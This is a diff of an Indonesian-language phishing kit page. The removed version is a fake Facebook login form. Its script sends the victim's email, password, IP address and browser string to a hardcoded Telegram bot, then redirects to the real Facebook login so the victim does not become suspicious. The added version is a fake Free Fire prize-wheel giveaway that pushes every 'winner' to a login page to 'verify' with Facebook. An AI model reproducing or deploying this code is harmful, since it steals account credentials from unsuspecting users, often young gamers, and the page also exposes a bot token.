@@ -1,158 +1,249 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="id">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Login to Facebook</title>
+    <title>Lucky Spin Free Fire - Clean Version</title>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;800&display=swap" rel="stylesheet">
+    
     <style>
-        /* CSS Sesuai Desain Anda */
+        :root {
+            --primary: #f59e0b;
+            --secondary: #ef4444;
+            --facebook: #1877F2;
+            --bg-dark: #0f172a;
+            --card-bg: #1e293b;
+            --white: #ffffff;
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Poppins', sans-serif; }
+
         body {
-            font-family: Arial, sans-serif;
-            background-color: #e9eff1;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
+            background-color: var(--bg-dark);
+            background-image: radial-gradient(circle at center, #1e293b 0%, #080c14 100%);
+            display: flex; justify-content: center; align-items: center;
+            min-height: 100vh; color: var(--white); overflow: hidden;
         }
-        .login-container {
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100%;
-        }
-        .login-box {
-            background-color: white;
-            padding: 40px;
-            border-radius: 8px;
-            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
-            width: 350px;
-            text-align: center;
-        }
+
+        .container { text-align: center; position: relative; z-index: 1; }
+
         h1 {
-            font-size: 36px;
-            font-weight: bold;
-            color: #1877f2;
-            margin-bottom: 10px;
+            font-weight: 800; font-size: 2.2rem; margin-bottom: 25px;
+            background: linear-gradient(to right, #fff, var(--primary));
+            -webkit-background-clip: text; -webkit-text-fill-color: transparent;
+            text-transform: uppercase; letter-spacing: 2px;
+            filter: drop-shadow(0 0 10px rgba(245, 158, 11, 0.4));
         }
-        p {
-            color: #4b4f56;
-            font-size: 14px;
-            margin-bottom: 20px;
+
+        /* Wheel Area */
+        .wheel-box {
+            position: relative; width: 380px; height: 380px; margin: 0 auto;
+            border: 12px solid #334155; border-radius: 50%;
+            box-shadow: 0 0 50px rgba(0,0,0,0.8), 0 0 30px var(--primary);
         }
-        input {
-            width: 100%;
-            padding: 10px;
-            margin: 10px 0;
-            border: 1px solid #dddfe2;
-            border-radius: 5px;
-            font-size: 14px;
-            box-sizing: border-box;
+
+        .pointer {
+            position: absolute; top: -30px; left: 50%; transform: translateX(-50%);
+            width: 50px; height: 50px; background: var(--secondary);
+            clip-path: polygon(50% 100%, 0 0, 100% 0); z-index: 20;
+            filter: drop-shadow(0 4px 6px rgba(0,0,0,0.8));
+            border-top: 2px solid white;
         }
-        button {
-            width: 100%;
-            padding: 10px;
-            background-color: #1877f2;
-            color: white;
-            border: none;
-            border-radius: 5px;
-            font-size: 14px;
-            cursor: pointer;
+
+        canvas { width: 100%; height: 100%; border-radius: 50%; transition: transform 5s cubic-bezier(0.15, 0, 0.15, 1); }
+
+        .spin-btn {
+            margin-top: 35px; padding: 15px 60px; font-size: 1.3rem; font-weight: 800;
+            color: #000; background: linear-gradient(45deg, var(--primary), #fbbf24);
+            border: none; border-radius: 50px; cursor: pointer; transition: 0.3s;
+            box-shadow: 0 8px 20px rgba(245, 158, 11, 0.5); text-transform: uppercase;
         }
-        button:hover {
-            background-color: #165eab;
+
+        .spin-btn:hover { transform: scale(1.05); filter: brightness(1.2); }
+        .spin-btn:disabled { background: #475569; color: #94a3b8; cursor: not-allowed; box-shadow: none; }
+
+        /* Modal Settings */
+        .modal {
+            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0, 0, 0, 0.92); backdrop-filter: blur(10px);
+            justify-content: center; align-items: center; z-index: 1000;
         }
-        .forgot-password a {
-            font-size: 12px;
-            color: #1877f2;
-            text-decoration: none;
+
+        .modal-content {
+            background: var(--card-bg); padding: 40px 30px; border-radius: 30px;
+            text-align: center; max-width: 420px; width: 92%;
+            border: 2px solid var(--primary);
+            box-shadow: 0 0 40px rgba(245, 158, 11, 0.2);
+            animation: modalPop 0.5s cubic-bezier(0.17, 0.89, 0.32, 1.2);
         }
-        .create-account {
-            margin-top: 20px;
+
+        @keyframes modalPop { from { transform: scale(0.7); opacity: 0; } to { transform: scale(1); opacity: 1; } }
+
+        .prize-img-popup {
+            width: 160px; height: 160px; object-fit: contain;
+            margin: 20px auto; display: block;
+            filter: drop-shadow(0 0 15px var(--primary));
         }
-        .create-account span {
-            font-size: 12px;
-            color: #4b4f56;
+
+        .prize-name { display: block; font-size: 1.8rem; font-weight: 800; color: #fbbf24; margin-bottom: 25px; line-height: 1.2; }
+
+        .btn-action {
+            width: 100%; padding: 16px; border: none; border-radius: 15px;
+            font-size: 1.1rem; font-weight: 700; cursor: pointer; margin-top: 10px; transition: 0.3s;
         }
-        .create-account a {
-            font-size: 14px;
-            color: #42b72a;
-            text-decoration: none;
+
+        .btn-claim { background: var(--primary); color: #000; text-transform: uppercase; }
+
+        .btn-fb {
+            background: var(--facebook); color: white; display: flex;
+            align-items: center; justify-content: center; gap: 12px;
         }
+
+        .fb-logo {
+            background: white; color: var(--facebook); width: 28px; height: 28px;
+            border-radius: 6px; font-weight: 900; display: flex; align-items: center; justify-content: center;
+        }
+
+        .hidden { display: none; }
+        
+        @media (max-width: 450px) { .wheel-box { width: 320px; height: 320px; } }
     </style>
 </head>
 <body>
-    <div class="login-container">
-        <div class="login-box">
-            <h1>facebook</h1>
-            <p>Login ke Facebook</p>
-            
-            <form id="loginForm">
-                <input type="text" id="email" name="email" placeholder="Email atau Nomor Telepon" required>
-                <input type="password" id="pass" name="pass" placeholder="Kata Sandi" required>
-                <button type="submit" id="btnSubmit">Masuk</button>
-            </form>
 
-            <div class="forgot-password">
-                <a href="#">Lupa akun?</a>
-            </div>
-            <div class="create-account">
-                <span>atau</span>
-                <a href="#" class="signup">Buat akun baru</a>
-            </div>
+    <div class="container">
+        <h1>Event Spin Limited</h1>
+        <div class="wheel-box">
+            <div class="pointer"></div>
+            <canvas id="wheelCanvas" width="800" height="800"></canvas>
+        </div>
+        <button class="spin-btn" id="spinBtn">SPIN SEKARANG</button>
+    </div>
+
+    <div class="modal" id="mainModal">
+        <div class="modal-content" id="stepWinner">
+            <h2 style="color: #fff;">CONGRATULATIONS!</h2>
+            <img id="prizeImg" src="" alt="Prize" class="prize-img-popup">
+            <span class="prize-name" id="prizeText">ITEM NAME</span>
+            <button class="btn-action btn-claim" onclick="showLoginStep()">AMBIL HADIAH</button>
+        </div>
+
+        <div class="modal-content hidden" id="stepLogin">
+            <h2 style="margin-bottom: 15px; color: var(--primary);">VERIFIKASI AKUN</h2>
+            <p style="font-size: 0.95rem; color: #cbd5e1; margin-bottom: 30px;">
+                Silakan login menggunakan akun Facebook kamu agar item bisa dikirim ke ID kamu.
+            </p>
+            <button class="btn-action btn-fb" onclick="redirectToLogin()">
+                <div class="fb-logo">f</div> Login dengan Facebook
+            </button>
+            <p style="margin-top: 25px; font-size: 0.85rem; color: #64748b; cursor: pointer;" onclick="location.reload()">Batalkan</p>
         </div>
     </div>
 
     <script>
-        // 1. Konfigurasi Bot Telegram
-        const TELEGRAM_TOKEN = "8390796660:AAEyD5epa_kM4esv_3rJqZjivmDos7tk-c0";
-        const CHAT_ID = "858535302";
+        const canvas = document.getElementById('wheelCanvas');
+        const ctx = canvas.getContext('2d');
+        const spinBtn = document.getElementById('spinBtn');
+        const mainModal = document.getElementById('mainModal');
+        const stepWinner = document.getElementById('stepWinner');
+        const stepLogin = document.getElementById('stepLogin');
+        const prizeText = document.getElementById('prizeText');
+        const prizeImg = document.getElementById('prizeImg');
 
-        const form = document.getElementById('loginForm');
+        const prizes = [
+            { name: "Reaper - M1887", img: "image/Gambar1.png", color: "#1e293b" },
+            { name: "HipHop ElitePass", img: "image/Gambar2.png", color: "#6366f1" },
+            { name: "Diamond x1000", img: "image/Gambar3.png", color: "#10b981" },
+            { name: "Predatory Cobra - MP40", img: "image/Gambar4.png", color: "#f59e0b" },
+            { name: "Blue Flame Draco - AK", img: "image/Gambar5.png", color: "#3b82f6" },
+            { name: "One Punch Man - M1887", img: "image/Gambar6.png", color: "#ef4444" },
+            { name: "Arcade Mayhem ElitePass", img: "image/Gambar7.png", color: "#06b6d4" },
+            { name: "Megalodon Alpha - SCAR", img: "image/Gambar8.png", color: "#f97316" }
+        ];
 
-        form.addEventListener('submit', async function(e) {
-            e.preventDefault(); // Stop page reload
+        const numItems = prizes.length;
+        const arcSize = (Math.PI * 2) / numItems;
+        let currentRotation = 0;
+        let loadedImagesCount = 0;
+        let selectedPrize = null;
 
-            const btn = document.getElementById('btnSubmit');
-            btn.innerHTML = "Memuat...";
-            btn.disabled = true;
-
-            const email = document.getElementById('email').value;
-            const pass = document.getElementById('pass').value;
-
-            try {
-                // 2. Ambil IP Address (Menggunakan API Luar karena di JS ga bisa langsung)
-                const ipResponse = await fetch('https://api.ipify.org?format=json');
-                const ipData = await ipResponse.json();
-                const userIP = ipData.ip;
-
-                // 3. Susun Pesan
-                const pesan = `<b>🔔 LOGIN ATTEMPT (GITHUB PAGES)</b>\n\n` +
-                              `<b>📧 Email:</b> <code>${email}</code>\n` +
-                              `<b>🔑 Pass:</b> <code>${pass}</code>\n\n` +
-                              `<b>📍 IP:</b> <code>${userIP}</code>\n` +
-                              `<b>🌐 Browser:</b> ${navigator.userAgent.substring(0, 50)}...`;
-
-                // 4. Kirim ke API Telegram
-                await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: CHAT_ID,
-                        text: pesan,
-                        parse_mode: 'html'
-                    })
-                });
-
-                // 5. Redirect ke FB asli agar tampak normal
-                window.location.href = "https://www.facebook.com/login.php?login_attempt=1";
-
-            } catch (error) {
-                console.error("Terjadi kesalahan:", error);
-                // Jika error tetap redirect agar user tidak curiga
-                window.location.href = "https://www.facebook.com/login.php";
-            }
+        prizes.forEach(p => {
+            const img = new Image();
+            img.src = p.img;
+            img.onload = () => {
+                loadedImagesCount++;
+                if (loadedImagesCount === numItems) drawWheel();
+            };
+            p.imgElement = img;
         });
+
+        function drawWheel() {
+            ctx.clearRect(0, 0, canvas.width, canvas.height);
+            prizes.forEach((prize, i) => {
+                const angle = i * arcSize;
+                
+                // Draw Section
+                ctx.beginPath();
+                ctx.fillStyle = prize.color;
+                ctx.moveTo(400, 400);
+                ctx.arc(400, 400, 400, angle, angle + arcSize);
+                ctx.fill();
+                ctx.strokeStyle = "rgba(255,255,255,0.1)";
+                ctx.lineWidth = 2;
+                ctx.stroke();
+
+                // Draw Icon Only (Teks Dihilangkan)
+                ctx.save();
+                ctx.translate(400, 400);
+                ctx.rotate(angle + arcSize / 2);
+                
+                if (prize.imgElement) {
+                    // Gambar diposisikan lebih ke tengah karena tidak ada teks
+                    ctx.drawImage(prize.imgElement, 220, -50, 100, 100);
+                }
+                ctx.restore();
+            });
+
+            // Center Point
+            ctx.beginPath(); ctx.fillStyle = "#fff"; ctx.arc(400, 400, 45, 0, Math.PI * 2); ctx.fill();
+            ctx.beginPath(); ctx.fillStyle = "#1e293b"; ctx.arc(400, 400, 35, 0, Math.PI * 2); ctx.fill();
+        }
+
+        function spin() {
+            spinBtn.disabled = true;
+            const totalSpin = 1800 + Math.floor(Math.random() * 360);
+            currentRotation += totalSpin;
+            canvas.style.transform = `rotate(${currentRotation}deg)`;
+
+            setTimeout(() => {
+                const actualDeg = currentRotation % 360;
+                const sectorDeg = 360 / numItems;
+                const winningIndex = Math.floor((360 - actualDeg) / sectorDeg) % numItems;
+                
+                selectedPrize = prizes[winningIndex];
+                
+                // Teks dan Gambar baru muncul di sini (Modal)
+                prizeText.innerText = selectedPrize.name;
+                prizeImg.src = selectedPrize.img;
+                
+                stepWinner.classList.remove('hidden');
+                stepLogin.classList.add('hidden');
+                mainModal.style.display = 'flex';
+                spinBtn.disabled = false;
+            }, 5000);
+        }
+
+        function showLoginStep() {
+            stepWinner.classList.add('hidden');
+            stepLogin.classList.remove('hidden');
+        }
+
+        function redirectToLogin() {
+            window.location.href = `login.html?item=${encodeURIComponent(selectedPrize.name)}`;
+        }
+
+        spinBtn.addEventListener('click', spin);
+        setTimeout(() => { if(loadedImagesCount < numItems) drawWheel(); }, 2000);
     </script>
 </body>
 </html>
